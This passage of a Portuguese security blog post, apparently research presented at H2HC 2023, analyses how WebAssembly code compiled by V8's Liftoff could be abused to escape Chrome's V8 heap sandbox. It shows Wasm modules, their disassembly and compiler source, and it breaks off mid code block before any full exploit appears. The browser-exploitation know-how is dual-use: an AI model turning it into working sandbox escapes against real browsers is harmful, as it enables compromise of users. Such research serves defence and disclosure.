<html>

<head>
  <title>retr0.zip</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../../style/main.css">
  <link rel="stylesheet" href="../../style/post.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

  <script>
    hljs.highlightAll();
    window.onload = () => {
      const dateDocument = document.querySelector('blockquote > p');
      const dateString = new Date(dateDocument.innerText).toLocaleDateString(navigator.language, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
      dateDocument.innerText = dateString;
    }
  </script>
</head>

<body>
  <div class="center-container"><h1
id="abusing-liftoff-assembly-and-efficiently-escaping-from-sbx">Abusing
Liftoff assembly and efficiently escaping from sbx</h1>
<blockquote>
<p>2023-12-12</p>
</blockquote>
<blockquote>
<p>Essa foi uma pesquisa publicada durante a H2HC 2023! Muitos
agradecimentos a <a href="https://twitter.com/bsdaemon"><span
class="citation" data-cites="bsdaemon">@bsdaemon</span></a>, <a
href="https://twitter.com/filipebalestra"><span class="citation"
data-cites="filipebalestra">@filipebalestra</span></a>, <a
href="https://twitter.com/gabrielnb"><span class="citation"
data-cites="gabrielnb">@gabrielnb</span></a> e toda equipe por criar e
manter esse evento incrivel!</p>
</blockquote>
<p>O Chrome vem criando novas mitigações a fim de inviabilizar, ou pelo
menos dificultar, a exploração do v8, pois a complexidade de implementar
a especificação mais moderna do ECMAScript e manter uma performance de
alto nível são uma tarefa muito complexa e uma enorme superfície de
ataque. Tendo isso em mente, o projeto “<a
href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit">V8
Sandbox</a>” foi desenvolvido.</p>
<p>Essa sandbox é um pouco diferente do convencional. Não existem dois
processos distintos ou uma limitante de poderes para o v8, o design da
sandbox é baseado no isolamento da Heap e no poder de corrupção.
Basicamente, o v8 aloca uma região de memória, a chamada “V8 Sandbox”, e
nela coloca todos os JSObjects. Ou seja, todos os objetos em si do JS. O
ponto crucial é remover todos os ponteiros raw de 64 bits de dentro da
Sandbox e trocar por offsets (de 32 a 40 bits) ou índices de tabelas
estrangeiras(de fora da heap). Dessa forma, ao adquirir algum bug,
fica-se limitado para corromper dados de dentro da Sandbox e não
resultaria em nada mais que um crash.</p>
<figure>
<img src="/assets/imgs/abusing-liftoff-assembly/v8-sandbox.png"
alt="v8-sandbox.png" />
<figcaption aria-hidden="true">v8-sandbox.png</figcaption>
</figure>
<p>Podemos ver que para acessar um <code>ArrayBuffer</code>, utilizamos
um offset de 40 bits, então, caso se possa corromper tal endereço, não
será possível escapar da Sandbox para escrever na página Wasm RWX, por
exemplo. Da mesma forma, para acessar entidades externas, como a DOM,
será usado um índice (0, 1, 2, 3…) e o mesmo ocorrerá com os
<code>Code Pointers</code>. Como não temos nem o offset do ponteiro da
função, também inválida a possibilidade de executar o código com
<code>JIT spray</code> - uma técnica na qual utilizamos o JIT para criar
instruções específicas de <code>mov</code>, e depois desalinhar o
ponteiro de entry point, a fim de conseguir executar um shellcode.</p>
<ul>
<li>Olhando para este grande gráfico, ele parece bastante
intimidante.</li>
</ul>
<h2 id="liftoff"><strong>Liftoff</strong></h2>
<p>O <strong>Liftoff</strong> é o compilador de WebAssembly do v8, sendo
o seu objetivo o de criar o assembly relativo de um código Wasm o mais
rápido possível. Para o caso de ser necessário posteriormente, o código
será otimizado pelo TurboFan. O interessante aqui são alguns opcodes
gerados pelo Liftoff, podemos usar o seguinte código em Wasm e ver o
resultado compilado:</p>
<pre class="wasm"><code>;; Literally do nothing
(module
  (func (export &quot;nop&quot;)
    nop
  )
)</code></pre>
<div class="sourceCode" id="cb2"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>// ./d8 <span class="op">--</span>print<span class="op">-</span>code <span class="op">--</span>allow<span class="op">-</span>natives<span class="op">-</span>syntax <span class="op">--</span>shell exp<span class="op">.</span>js</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>V8 version <span class="fl">12.1</span><span class="fu">.0</span> <span class="op">(</span>candidate<span class="op">)</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> nop<span class="op">()</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>--- WebAssembly code <span class="op">---</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="fu">name:</span> wasm<span class="op">-</span>function<span class="op">[</span><span class="dv">0</span><span class="op">]</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="fu">index:</span> 0</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="fu">kind:</span> wasm function</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="fu">compiler:</span> Liftoff</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>Body <span class="op">(</span>size <span class="op">=</span> <span class="dv">128</span> <span class="op">=</span> <span class="dv">80</span> <span class="op">+</span> <span class="dv">48</span> padding<span class="op">)</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>Instructions <span class="op">(</span>size <span class="op">=</span> <span class="dv">68</span><span class="op">)</span></span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c00     0  55                   <span class="kw">push</span> <span class="kw">rbp</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c01     1  4889e5               REX<span class="op">.</span>W movq <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c04     4  6a08                 <span class="kw">push</span> <span class="bn">0x8</span></span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c06     6  56                   <span class="kw">push</span> <span class="kw">rsi</span></span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c07     7  4881ec10000000       REX<span class="op">.</span>W subq <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x10</span></span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c0e     e  <span class="dv">493</span><span class="er">b65a0</span>             REX<span class="op">.</span>W cmpq <span class="kw">rsp</span><span class="op">,[</span><span class="kw">r13</span><span class="op">-</span><span class="bn">0x60</span><span class="op">]</span></span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c12    12  0f8613000000         <span class="cf">jna</span> <span class="bn">0x3b34546a5c2b</span>  <span class="op">&lt;+</span><span class="bn">0x2b</span><span class="op">&gt;</span></span>
<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c18    18  4c8b5677             REX<span class="op">.</span>W movq <span class="kw">r10</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x77</span><span class="op">]</span></span>
<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c1c    1c  41832a18             subl <span class="op">[</span><span class="kw">r10</span><span class="op">],</span><span class="bn">0x18</span></span>
<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c20    20  0f8810000000         <span class="cf">js</span> <span class="bn">0x3b34546a5c36</span>  <span class="op">&lt;+</span><span class="bn">0x36</span><span class="op">&gt;</span></span>
<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c26    26  488be5               REX<span class="op">.</span>W movq <span class="kw">rsp</span><span class="op">,</span><span class="kw">rbp</span></span>
<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c29    29  5d                   <span class="kw">pop</span> <span class="kw">rbp</span></span>
<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c2a    2a  c3                   retl</span>
<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c2b    2b  e8d0f6ffff           call <span class="bn">0x3b34546a5300</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c30    30  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c34    34  ebe2                 jmp <span class="bn">0x3b34546a5c18</span>  <span class="op">&lt;+</span><span class="bn">0x18</span><span class="op">&gt;</span></span>
<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c36    36  e825f5ffff           call <span class="bn">0x3b34546a5160</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c3b    3b  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c3f    3f  ebe5                 jmp <span class="bn">0x3b34546a5c26</span>  <span class="op">&lt;+</span><span class="bn">0x26</span><span class="op">&gt;</span></span>
<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c41    41  0f1f00               <span class="kw">nop</span></span>
<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-32"><a href="#cb2-32" aria-hidden="true" tabindex="-1"></a>Source positions<span class="op">:</span></span>
<span id="cb2-33"><a href="#cb2-33" aria-hidden="true" tabindex="-1"></a> pc offset  position</span>
<span id="cb2-34"><a href="#cb2-34" aria-hidden="true" tabindex="-1"></a>        2b         0  statement</span>
<span id="cb2-35"><a href="#cb2-35" aria-hidden="true" tabindex="-1"></a>        36         2  statement</span>
<span id="cb2-36"><a href="#cb2-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-37"><a href="#cb2-37" aria-hidden="true" tabindex="-1"></a>Safepoints <span class="op">(</span>entries <span class="op">=</span> <span class="dv">1</span><span class="op">,</span> <span class="dt">byte</span> size <span class="op">=</span> <span class="dv">10</span><span class="op">)</span></span>
<span id="cb2-38"><a href="#cb2-38" aria-hidden="true" tabindex="-1"></a>0x3b34546a5c30     30  slots <span class="op">(</span><span class="kw">sp</span><span class="op">-&gt;</span>fp<span class="op">):</span> <span class="dv">00000000</span></span>
<span id="cb2-39"><a href="#cb2-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-40"><a href="#cb2-40" aria-hidden="true" tabindex="-1"></a>RelocInfo <span class="op">(</span>size <span class="op">=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb2-41"><a href="#cb2-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-42"><a href="#cb2-42" aria-hidden="true" tabindex="-1"></a>--- End code <span class="op">---</span></span></code></pre></div>
<p>Perto do meio da função podemos ver duas instruções muito
peculiares:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">;; [1]</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">mov</span> <span class="kw">r10</span><span class="op">,</span> <span class="op">[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x77</span><span class="op">]</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>subl <span class="op">[</span><span class="kw">r10</span><span class="op">],</span> <span class="bn">0x18</span></span></code></pre></div>
<p>Se usarmos um <em>debugger</em> podemos ver que <code>rsi</code> é um
ponteiro para a <code>WasmInstance</code>, Objeto que reside dentro da
V8 Sandbox:</p>
<figure>
<img src="/assets/imgs/abusing-liftoff-assembly/debug-print.png"
alt="debug-print.png" />
<figcaption aria-hidden="true">debug-print.png</figcaption>
</figure>
<p>Hmm, interessante. Vamos usar outro código para ver outra
situação:</p>
<pre class="wasm"><code>;; Get 2 params, 32bits offset and 64bits to write
(module
  (memory 1)

  (func (export &quot;write&quot;)
    (param $offset i32)  ;; Offset within memory
    (param $value i64)   ;; 64-bit integer to write
    (i64.store
      (local.get $offset)  ;; Get the memory offset
      (local.get $value)   ;; Get the i64 value
    )
  )
)</code></pre>
<div class="sourceCode" id="cb5"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>// ./d8 <span class="op">--</span>print<span class="op">-</span>code <span class="op">--</span>allow<span class="op">-</span>natives<span class="op">-</span>syntax <span class="op">--</span>shell exp<span class="op">.</span>js</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>V8 version <span class="fl">12.1</span><span class="fu">.0</span> <span class="op">(</span>candidate<span class="op">)</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> write<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">10</span><span class="er">n</span><span class="op">)</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>--- WebAssembly code <span class="op">---</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="fu">name:</span> wasm<span class="op">-</span>function<span class="op">[</span><span class="dv">1</span><span class="op">]</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="fu">index:</span> 1</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="fu">kind:</span> wasm function</span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="fu">compiler:</span> Liftoff</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>Body <span class="op">(</span>size <span class="op">=</span> <span class="dv">128</span> <span class="op">=</span> <span class="dv">104</span> <span class="op">+</span> <span class="dv">24</span> padding<span class="op">)</span></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>Instructions <span class="op">(</span>size <span class="op">=</span> <span class="dv">92</span><span class="op">)</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b80     0  55                   <span class="kw">push</span> <span class="kw">rbp</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b81     1  4889e5               REX<span class="op">.</span>W movq <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b84     4  6a08                 <span class="kw">push</span> <span class="bn">0x8</span></span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b86     6  56                   <span class="kw">push</span> <span class="kw">rsi</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b87     7  4881ec10000000       REX<span class="op">.</span>W subq <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x10</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b8e     e  <span class="dv">493</span><span class="er">b65a0</span>             REX<span class="op">.</span>W cmpq <span class="kw">rsp</span><span class="op">,[</span><span class="kw">r13</span><span class="op">-</span><span class="bn">0x60</span><span class="op">]</span></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b92    12  0f8623000000         <span class="cf">jna</span> <span class="bn">0x2376a15e0bbb</span>  <span class="op">&lt;+</span><span class="bn">0x3b</span><span class="op">&gt;</span></span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b98    18  488b4e27             REX<span class="op">.</span>W movq <span class="kw">rcx</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x27</span><span class="op">]</span></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>0x2376a15e0b9c    1c  48c1e918             REX<span class="op">.</span>W shrq <span class="kw">rcx</span><span class="op">,</span> <span class="dv">24</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="co">;;                    ^ opcode do shr</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>0x2376a15e0ba0    20  4903ce               REX<span class="op">.</span>W addq <span class="kw">rcx</span><span class="op">,</span><span class="kw">r14</span></span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>0x2376a15e0ba3    23  48891401             REX<span class="op">.</span>W movq <span class="op">[</span><span class="kw">rcx</span><span class="op">+</span><span class="kw">rax</span><span class="op">*</span><span class="dv">1</span><span class="op">],</span><span class="kw">rdx</span></span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>0x2376a15e0ba7    27  4c8b5677             REX<span class="op">.</span>W movq <span class="kw">r10</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x77</span><span class="op">]</span></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bab    2b  41836a0427           subl <span class="op">[</span><span class="kw">r10</span><span class="op">+</span><span class="bn">0x4</span><span class="op">],</span><span class="bn">0x27</span></span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bb0    30  0f8814000000         <span class="cf">js</span> <span class="bn">0x2376a15e0bca</span>  <span class="op">&lt;+</span><span class="bn">0x4a</span><span class="op">&gt;</span></span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bb6    36  488be5               REX<span class="op">.</span>W movq <span class="kw">rsp</span><span class="op">,</span><span class="kw">rbp</span></span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bb9    39  5d                   <span class="kw">pop</span> <span class="kw">rbp</span></span>
<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bba    3a  c3                   retl</span>
<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bbb    3b  50                   <span class="kw">push</span> <span class="kw">rax</span></span>
<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bbc    3c  52                   <span class="kw">push</span> <span class="kw">rdx</span></span>
<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bbd    3d  e83ef7ffff           call <span class="bn">0x2376a15e0300</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bc2    42  5a                   <span class="kw">pop</span> <span class="kw">rdx</span></span>
<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bc3    43  58                   <span class="kw">pop</span> <span class="kw">rax</span></span>
<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bc4    44  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bc8    48  ebce                 jmp <span class="bn">0x2376a15e0b98</span>  <span class="op">&lt;+</span><span class="bn">0x18</span><span class="op">&gt;</span></span>
<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bca    4a  50                   <span class="kw">push</span> <span class="kw">rax</span></span>
<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bcb    4b  51                   <span class="kw">push</span> <span class="kw">rcx</span></span>
<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bcc    4c  52                   <span class="kw">push</span> <span class="kw">rdx</span></span>
<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bcd    4d  e88ef5ffff           call <span class="bn">0x2376a15e0160</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bd2    52  5a                   <span class="kw">pop</span> <span class="kw">rdx</span></span>
<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bd3    53  59                   <span class="kw">pop</span> <span class="kw">rcx</span></span>
<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bd4    54  58                   <span class="kw">pop</span> <span class="kw">rax</span></span>
<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bd5    55  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bd9    59  ebdb                 jmp <span class="bn">0x2376a15e0bb6</span>  <span class="op">&lt;+</span><span class="bn">0x36</span><span class="op">&gt;</span></span>
<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>0x2376a15e0bdb    5b  90                   <span class="kw">nop</span></span>
<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a>Protected instructions<span class="op">:</span></span>
<span id="cb5-48"><a href="#cb5-48" aria-hidden="true" tabindex="-1"></a> pc offset</span>
<span id="cb5-49"><a href="#cb5-49" aria-hidden="true" tabindex="-1"></a>        23         </span>
<span id="cb5-50"><a href="#cb5-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-51"><a href="#cb5-51" aria-hidden="true" tabindex="-1"></a>Source positions<span class="op">:</span></span>
<span id="cb5-52"><a href="#cb5-52" aria-hidden="true" tabindex="-1"></a> pc offset  position</span>
<span id="cb5-53"><a href="#cb5-53" aria-hidden="true" tabindex="-1"></a>        23         5  statement</span>
<span id="cb5-54"><a href="#cb5-54" aria-hidden="true" tabindex="-1"></a>        3d         0  statement</span>
<span id="cb5-55"><a href="#cb5-55" aria-hidden="true" tabindex="-1"></a>        4d         8  statement</span>
<span id="cb5-56"><a href="#cb5-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-57"><a href="#cb5-57" aria-hidden="true" tabindex="-1"></a>Safepoints <span class="op">(</span>entries <span class="op">=</span> <span class="dv">1</span><span class="op">,</span> <span class="dt">byte</span> size <span class="op">=</span> <span class="dv">11</span><span class="op">)</span></span>
<span id="cb5-58"><a href="#cb5-58" aria-hidden="true" tabindex="-1"></a>0x2376a15e0ba3     23  slots <span class="op">(</span><span class="kw">sp</span><span class="op">-&gt;</span>fp<span class="op">):</span> <span class="dv">0000000000000000</span></span>
<span id="cb5-59"><a href="#cb5-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-60"><a href="#cb5-60" aria-hidden="true" tabindex="-1"></a>RelocInfo <span class="op">(</span>size <span class="op">=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb5-61"><a href="#cb5-61" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-62"><a href="#cb5-62" aria-hidden="true" tabindex="-1"></a>--- End code <span class="op">---</span></span></code></pre></div>
<p>Perto do meio da função, podemos ver as seguintes instruções:</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">;; [2]</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="kw">mov</span> <span class="kw">rcx</span><span class="op">,</span> <span class="op">[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x27</span><span class="op">]</span> <span class="co">;; address from v8 cage</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">shr</span> <span class="kw">rcx</span><span class="op">,</span> <span class="dv">24</span>         <span class="co">;; shift to limit address size</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="kw">add</span> <span class="kw">rcx</span><span class="op">,</span> <span class="kw">r14</span>        <span class="co">;; add base with sandbox offset</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="kw">mov</span> <span class="op">[</span><span class="kw">rcx</span><span class="op">+</span><span class="kw">rax</span><span class="op">],</span> <span class="kw">rdx</span>  <span class="co">;; write we 64bit(rdx) to base(rcx) + input offset(rax)</span></span></code></pre></div>
<p>Podemos analisar no compilador o código responsável por gerar esses
trechos de códigos e vamos perceber exatamente qual a diferença desses
dois acessos à memória:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/x64/liftoff-assembler-x64-inl.h;l=323-340;drc=c2783fca4a60fb1ca2cd3b05bc7676396905f8f9</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> LiftoffAssembler<span class="op">::</span>CheckTierUp<span class="op">(</span><span class="dt">int</span> declared_func_index<span class="op">,</span> <span class="dt">int</span> budget_used<span class="op">,</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>                                   Label<span class="op">*</span> ool_label<span class="op">,</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>                                   <span class="at">const</span> FreezeCacheState<span class="op">&amp;</span> frozen<span class="op">)</span> <span class="op">{</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>  Register instance <span class="op">=</span> <span class="va">cache_state_</span><span class="op">.</span>cached_instance<span class="op">;</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>instance <span class="op">==</span> no_reg<span class="op">)</span> <span class="op">{</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    instance <span class="op">=</span> kScratchRegister<span class="op">;</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    LoadInstanceFromFrame<span class="op">(</span>instance<span class="op">);</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>  Register budget_array <span class="op">=</span> kScratchRegister<span class="op">;</span>  <span class="co">// Overwriting {instance}.</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>  <span class="kw">constexpr</span> <span class="dt">int</span> kArrayOffset <span class="op">=</span> wasm<span class="op">::</span>ObjectAccess<span class="op">::</span>ToTagged<span class="op">(</span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>      WasmInstanceObject<span class="op">::</span>kTieringBudgetArrayOffset<span class="op">);</span></span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>  movq<span class="op">(</span>budget_array<span class="op">,</span> Operand<span class="op">{</span>instance<span class="op">,</span> kArrayOffset<span class="op">});</span></span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>  <span class="co">// [3]</span></span>
<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> offset <span class="op">=</span> kInt32Size <span class="op">*</span> declared_func_index<span class="op">;</span></span>
<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>  subl<span class="op">(</span>Operand<span class="op">{</span>budget_array<span class="op">,</span> offset<span class="op">},</span> Immediate<span class="op">(</span>budget_used<span class="op">));</span></span>
<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>  j<span class="op">(</span>negative<span class="op">,</span> ool_label<span class="op">);</span></span>
<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<div class="sourceCode" id="cb8"><pre
